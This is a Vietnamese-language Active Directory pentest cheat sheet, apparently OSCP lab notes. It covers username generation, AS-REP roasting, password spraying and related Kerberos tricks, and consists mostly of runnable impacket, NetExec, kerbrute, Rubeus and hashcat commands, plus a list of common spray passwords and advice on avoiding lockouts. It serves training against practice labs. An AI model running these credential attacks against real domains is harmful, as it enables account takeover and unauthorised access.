# 02 — Có username, chưa có mật khẩu (Valid username)

Bạn đã có danh sách user hợp lệ (`users.txt`). Hai con đường chính:
**AS-REP Roasting** (không cần mật khẩu) và **Password Spraying**.

---

## 1. Tạo danh sách username từ tên người

Khi chỉ có họ tên (trang web "Our Team"), cần đoán **định dạng** username
(`fsmith`, `f.smith`, `fergus.smith`, `smithf`...).

```bash
# names.txt:  Fergus Smith / Hugo Bear / ...
username-anarchy -i names.txt > possible_users.txt
# hoặc username-anarchy --select-format first.last,flast,first,firstl -i names.txt

# Kiểm tra định dạng nào đúng
kerbrute userenum -d $DOMAIN --dc $DC possible_users.txt
```

Sau khi biết định dạng (ví dụ `flast`), áp dụng cho tất cả tên khác.

**Lab:** HTB *Sauna* (trang About → `fsmith`), PG *Nagoya* (trang team → spray).

---

## 2. AS-REP Roasting

**Giải thích chi tiết:**
1. Bình thường Kerberos yêu cầu **pre-authentication**: client phải mã hóa
   timestamp bằng hash mật khẩu của mình trong AS-REQ để chứng minh danh tính.
2. Nếu tài khoản bật cờ `DONT_REQ_PREAUTH` (UF_DONT_REQUIRE_PREAUTH, giá trị
   `0x400000` trong `userAccountControl`), **bất kỳ ai** gửi AS-REQ cho user đó
   đều nhận AS-REP.
3. Một phần AS-REP được mã hóa bằng **khóa dẫn xuất từ mật khẩu user** → mang về
   crack offline bằng hashcat mode **18200**.

```bash
# Từ Kali, không có credential, có danh sách user
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.txt

# Có credential bất kỳ → tự tìm mọi user bị bật cờ
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat -outputfile asrep.txt
nxc ldap $DC -u $USER -p $PASS --asreproast asrep.txt
nxc ldap $DC -u users.txt -p '' --asreproast asrep.txt          # không cần credential

# Từ Windows
PS> .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
PS> Get-DomainUser -PreauthNotRequired | select samaccountname      # PowerView

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=rockyou.txt asrep.txt
```

Hash dạng: `$krb5asrep$23$svc-alfresco@HTB.LOCAL:3c5a...`

**Biến thể – Targeted AS-REP roast:** nếu bạn có quyền `GenericWrite`/`GenericAll`
trên một user, có thể **tự bật cờ** `DONT_REQ_PREAUTH` rồi roast:

```bash
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add uac targetuser -f DONT_REQ_PREAUTH
impacket-GetNPUsers $DOMAIN/ -usersfile <(echo targetuser) -no-pass -dc-ip $DC -format hashcat
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS remove uac targetuser -f DONT_REQ_PREAUTH   # dọn dẹp
```

```powershell
PS> Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}   # PowerView: bật/tắt cờ
```

**Lab:** HTB *Forest* (`svc-alfresco`), HTB *Sauna* (`fsmith`), HTB *Blackfield*
(`support`), THM *Attacktive Directory* (`svc-admin`).

---

## 3. Password Spraying

**Giải thích:** Thử **một** mật khẩu cho **nhiều** user (ngược với brute force).
Tránh khóa tài khoản vì mỗi user chỉ bị thử 1 lần mỗi vòng.

### 3.1. Luôn kiểm tra chính sách khóa trước

```bash
nxc smb $DC -u '' -p '' --pass-pol        # hoặc với credential bất kỳ
# Account Lockout Threshold: 5   ← sai 5 lần thì khóa
# Reset Account Lockout Counter: 30 minutes
# "Account Lockout Threshold: None" → spray thoải mái
```

```powershell
PS> net accounts /domain
PS> Get-DomainPolicy | select -expand SystemAccess    # PowerView
```

Quy tắc: số lần thử < (threshold − 1) trong mỗi cửa sổ reset.

### 3.2. Chọn mật khẩu để spray

| Ý tưởng | Ví dụ |
|---------|-------|
| Mùa + năm | `Spring2025!`, `Winter2024`, `Summer2025` |
| Tên công ty + số | `Corp123!`, `Corp2025` |
| Mặc định tìm thấy trong share/notice | `Welcome1`, `Cicada$M6Corpb*@Lp#nZp!8` |
| `Password1`, `P@ssw0rd`, `Changeme123` | |
| **Username = password** | `svc_backup:svc_backup` |
| Mật khẩu vừa crack được của user khác | **Password reuse rất hay gặp trong OSCP** |

### 3.3. Lệnh

```bash
# SMB (sinh event 4625; dùng --continue-on-success để không dừng ở kết quả đầu)
nxc smb $DC -u users.txt -p 'Spring2025!' --continue-on-success
nxc smb $DC -u users.txt -p passwords.txt --continue-on-success      # cẩn thận lockout!

# username = password (mỗi dòng user thử với dòng password tương ứng)
nxc smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success

# Kerberos (nhanh, không sinh 4625 mà là 4771)
kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Spring2025!'

# Spray trên nhiều giao thức — một user có thể vào WinRM/RDP/MSSQL nhưng không SMB admin
nxc winrm 10.10.10.0/24 -u users.txt -p 'Spring2025!' --continue-on-success
nxc rdp   10.10.10.0/24 -u users.txt -p 'Spring2025!'
nxc mssql 10.10.10.0/24 -u users.txt -p 'Spring2025!'

# Spray hash (khi có NT hash từ dump SAM — Administrator local hay dùng chung)
nxc smb 10.10.10.0/24 -u Administrator -H $HASH --local-auth
```

```powershell
# Từ Windows trong domain
PS> Import-Module .\DomainPasswordSpray.ps1
PS> Invoke-DomainPasswordSpray -Password 'Spring2025!' -OutFile spray.txt
PS> .\kerbrute.exe passwordspray -d corp.local users.txt 'Spring2025!'
```

**Đọc output NetExec:**
- `[+] corp.local\alice:Spring2025!` → đúng.
- `STATUS_PASSWORD_MUST_CHANGE` → mật khẩu đúng nhưng phải đổi → đổi bằng
  `impacket-changepasswd` hoặc `smbpasswd -r $DC -U alice`.
- `STATUS_ACCOUNT_LOCKED_OUT` → **dừng ngay**.
- `STATUS_ACCOUNT_DISABLED` → mật khẩu đúng nhưng tài khoản bị khóa.

```bash
impacket-changepasswd $DOMAIN/alice:'OldPass'@$DC -newpass 'NewPass123!'
```

**Lab:** HTB *Monteverde* (user = password `SABatchJobs`), HTB *Cicada* (mật
khẩu mặc định), HTB *Resolute* (mật khẩu trong description → spray tìm ai còn
dùng), HTB *Fuse*, PG *Nagoya* (`SeasonYear`), Vulnlab/HTB *Baby*
(`STATUS_PASSWORD_MUST_CHANGE`).

---

## 4. Các nhánh khác trên mindmap cho trạng thái này

- **Kerberoasting không cần mật khẩu**: nếu có một user *không pre-auth*, có thể
  yêu cầu service ticket thông qua AS-REQ của user đó:
  ```bash
  impacket-GetUserSPNs -no-preauth "asrep_user" -usersfile users.txt -dc-ip $DC $DOMAIN/
  ```
- **Blank password**: thử `-p ''` cho tất cả user.
- **Pre-Windows 2000 computer accounts**: tài khoản máy tạo với tùy chọn "Pre-2000"
  có mật khẩu = tên máy viết thường (không `$`). `nxc ldap $DC -u u -p p -M pre2k`
  (Vulnlab/HTB *Retro*).
- **Timeroasting** (NTP của DC trả về hash dẫn xuất từ mật khẩu máy) – hiếm gặp.

## Checklist

- [ ] `--pass-pol` trước khi spray
- [ ] AS-REP roast toàn bộ danh sách
- [ ] Spray: blank, user=user, mật khẩu mặc định, Season+Year, mật khẩu đã thu được
- [ ] Thử credential mới trên **mọi giao thức** (SMB, WinRM, RDP, MSSQL, LDAP) và **mọi máy**
